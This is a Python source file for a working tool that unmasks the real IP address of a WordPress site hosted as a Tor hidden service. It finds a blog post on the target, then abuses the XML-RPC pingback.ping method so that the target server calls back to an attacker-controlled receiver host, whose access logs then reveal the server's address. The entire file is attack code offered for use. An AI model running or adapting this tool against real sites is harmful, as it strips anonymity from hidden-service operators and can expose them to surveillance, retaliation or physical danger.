import requests
import json
import xmltodict
import urllib3
import re
from bs4 import BeautifulSoup
import argparse


PURPLE = '\033[95m'
CYAN = '\033[96m'
DARKCYAN = '\033[36m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'


class Tor_WP_XMLRPC_Leak:
    def __init__(self, target_host: str, receiver_host: str, time_out: str = 10) -> None:
        self.session = requests.session()
        self.session.proxies = {'http':  'socks5h://localhost:9050', 'https': 'socks5h://localhost:9050'}
        
        self.time_out = time_out
        self.target_host = target_host.rstrip("/")
        self.receiver_host = receiver_host.rstrip("/")
        self.target_identifier = re.sub(r'[^a-zA-Z0-9.]', '', self.target_host.lstrip("http://").lstrip("https://"))
        
        # Check if script runs using Tor
        if not self.using_tor():
            print(RED + "[!] You are not using a Tor Proxy.")
            exit(1)

        self.scan_target()


    def using_tor(self) -> bool:
        try:
            is_tor = self.session.get(
                f"https://check.torproject.org/api/ip",
                verify=False, 
                allow_redirects=True, 
                timeout=self.time_out, 
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "application/xml"}
            )
            if is_tor.status_code == 200:
                response = json.loads(is_tor.text)
                return response['IsTor']
        except:
            pass
        return False
    

    def scan_target(self):
        pingback_post = self.get_post()

        if pingback_post == None:
            print(RED + "[!] No blog post could be found to use for pingback request.")
            exit(1)
        
        print(GREEN + f"[√] Using blog post {pingback_post}...")
        self.send_pingback_request(pingback_post)

    
    def send_pingback_request(self, post_link: str):
        xml_body = f"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<methodCall>\n\t<methodName>pingback.ping</methodName>\n\t<params>\n\t\t<param>\n\t\t\t<value><string>{self.receiver_host}/{self.target_identifier}</string></value>\n\t\t</param>\n\t\t<param>\n\t\t\t<value><string>{post_link}</string></value>\n\t\t</param>\n\t</params>\n</methodCall>"
        pingback_request = self.session.post(
            f"{self.target_host}/xmlrpc.php", 
            data=xml_body, 
            verify=False, 
            allow_redirects=True, 
            timeout=self.time_out, 
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "application/xml"}
        )
        print(GREEN + f"[√] Sent XMLRPC pingback request to {self.receiver_host}/{self.target_identifier}.")

        if pingback_request.status_code == 200:
            xml = xmltodict.parse(pingback_request.content)

            if 'methodResponse' in xml and \
                'fault' in xml['methodResponse'] and \
                'value' in xml['methodResponse']['fault'] and \
                'struct' in xml['methodResponse']['fault']['value'] and \
                'member' in xml['methodResponse']['fault']['value']['struct']:

                for item in xml['methodResponse']['fault']['value']['struct']['member']:
                    if item['name'] == "faultCode" and item['value'] == {'int': '0'}:
                        print(GREEN + "[√] Received success response from XMLRPC request.")
                        print(BOLD + "\n[√] Check your receiver's host its request/access logs to see the target it's IP.\n")
            else:
                print(RED + "[!] Pingback returned incorrect response. Pingback request may not be successful.")
        else:
            print(RED + "[!] Pingback returned incorrect response status code. Pingback request may not be successful")
            


    def get_post(self):
        print(YELLOW + "[@] Trying to get a blog post to use for pingback request...")
        
        post = self.search_post_from_html()
        if post == None:
            post = self.search_post_from_feed()
        if post == None:
            post = self.search_post_from_api()
        if post == None:
            post = self.search_post_from_sitemap()

        return post


    def search_post_from_html(self):
        print(YELLOW + "[@] Trying HTML body method...")
        try:
            request_body = self.session.get(
                f"{self.target_host}", 
                verify=False, 
                allow_redirects=True, 
                timeout=self.time_out, 
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"}
            )
            if request_body.status_code == 200:
                soup = BeautifulSoup(request_body.text, 'html.parser')

                blog_post = soup.select_one(".wp-block-post-title a")
                if blog_post:
                    print(GREEN + "[√] Retrieved post link from HTML.")
                    return str(blog_post['href'])
        except:
            print(RED + "[!] Failed to retrieve from body")
        return None


    def search_post_from_feed(self):
        print(YELLOW + "[@] Trying feed method...")
        try:
            request_posts_feed = self.session.get(
                f"{self.target_host}/feed/", 
                verify=False, 
                allow_redirects=True, 
                timeout=self.time_out, 
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"}
            )
            if request_posts_feed.status_code == 200:
                xml = xmltodict.parse(request_posts_feed.content)
                items = xml['rss']['channel']['item']

                if type(items) == list:
                    print(GREEN + "[√] Retrieved post link from RSS.")
                    return str(xml['rss']['channel']['item'][0]['link'])
                elif type(items) == dict:
                    print(GREEN + "[√] Retrieved post link from RSS.")
                    return str(xml['rss']['channel']['item']['link'])
        except:
            print(RED + "[!] Failed to retrieve RSS")
        return None


    def search_post_from_api(self):
        print(YELLOW + "[@] Trying API method...")
        try:
            request_posts_api = self.session.get(
                f"{self.target_host}/wp-json/wp/v2/posts?per_page=1", 
                verify=False, 
                allow_redirects=True, 
                timeout=self.time_out, 
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"}
            )
            if request_posts_api.status_code == 200:
                posts = json.loads(request_posts_api.text)
                print(GREEN + "[√] Retrieved post link from API.")
                return posts[0]['link']
        except:
            print(RED + "[!] Failed to retrieve API")
        return None


    def search_post_from_sitemap(self):
        print(YELLOW + "[@] Trying sitemap method...")
        try:
            request_posts_xml = self.session.get(
                f"{self.target_host}/wp-sitemap-posts-post-1.xml", 
                verify=False, 
                allow_redirects=True, 
                timeout=self.time_out, 
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"}
            )
            if request_posts_xml.status_code == 200:
                xml = xmltodict.parse(request_posts_xml.content)
                print(GREEN + "[√] Retrieved post link from sitemap.")
                return str(xml['urlset']['url'][0]['loc'])
        except:
            print(RED + "[!] Failed to retrieve sitemap")
        return None


if __name__ == "__main__":
    print(PURPLE + BOLD + "Tor WordPress XMLRPC IP Leaker")
    print(END + PURPLE + "[•] Made by: https://github.com/joshuavanderpoll/Tor-Wordpress-IP-Leaker" + RED)

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parser = argparse.ArgumentParser(prog='Tor WordPress XMLRPC IP Leak', description='Uses the WordPress XMLRPC Pingback function to expose a Tor domain it\'s IP')

    parser.add_argument('--host', required=True, help="Domain which you want to use the XMLRPC pingback on")
    parser.add_argument('--pingback', required=True, help="Domain where to send ping request to")
    parser.add_argument('--timeout', required=False, default=10, help="Timeout for web requests", type=int)
    args = parser.parse_args()

    Tor_WP_XMLRPC_Leak(args.host, args.pingback, args.timeout)